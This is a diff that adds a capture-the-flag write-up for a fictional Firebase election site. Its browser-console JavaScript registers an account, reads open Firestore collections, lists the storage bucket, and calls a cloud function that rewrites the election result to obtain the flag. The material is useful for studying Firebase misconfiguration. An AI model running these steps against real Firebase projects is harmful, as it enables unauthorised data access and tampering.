@@ -1,0 +1,74 @@
+Register From Browser console
+	firebase.auth().createUserWithEmailAndPassword('test@mail.com', '123123');
+
+Get Stats from Browser console
+	firebase.firestore().collection("stats").get().then((res) => {
+	    res.docs.map((doc) => {
+	        console.log(doc.id)
+	        firebase.firestore().collection("stats").doc(doc.id).get().then((res) => {
+	            console.log(res.data())
+	        })
+	    })
+	});
+
+	Output
+	/*
+	{
+	  "winner":"[redacted]",
+	  "note_to_admin":"restrict access to the '/secret' collection",
+	  "winner_party":"[redacted]"
+	}
+	{
+	  "winner_party":"The Pink Party",
+	  "winner":"Chris McLean"
+	}
+	*/
+
+Try to access secret
+	firebase.firestore().collection("secret").get().then((res) => {
+	    res.docs.map((doc) => {
+	        console.log(doc.id)
+	        firebase.firestore().collection("secret").doc(doc.id).get().then((res) => {
+	            console.log(res.data())
+	        })
+	    })
+	});
+	/*
+	{
+	  "comment":"Backups are kept in the project's default bucket. Hail Hydra!"
+	}
+	*/
+
+
+List objects in bucket
+	firebase.storage().ref().listAll().then((r) => {
+        r.items.forEach((i) => {
+            console.log(`${i.name} -> ${i.bucket}`)
+        })
+    });
+    /*
+	ArrayOfPower:) -> official-wawanakwa-elections.appspot.com
+    WhyCanIWriteToThisDir?.bat -> official-wawanakwa-elections.appspot.com
+    index.js -> official-wawanakwa-elections.appspot.com
+    */
+
+Extract reference url of index.js
+	r = firebase.storage().ref().child('index.js');
+	r.getDownloadURL().then((u) => {
+		console.log(u)
+	});
+	/*
+    https://firebasestorage.googleapis.com/v0/b/official-wawanakwa-elections.appspot.com/o/index.js?alt=media&token=bf68a747-6948-43ac-b976-9fa1e74b2e3d
+    */
+
+Verify Email
+	await firebase.auth().createUserWithEmailAndPassword(email, "leoleo");
+	firebase.auth().currentUser.sendEmailVerification();
+
+Sign in and get flag
+	await firebase.auth().signInWithEmailAndPassword(email, "leoleo");
+	firebase.functions().httpsCallable('setResults2020')({"winner_party":"The Orange Party"}).then((r) => {
+        console.log(r.data);
+    });
+
+    "Good job! The flag is: X-MAS{oh_no_the_orange_party_has_the_nuclear_button-061b5d6be235263e}"
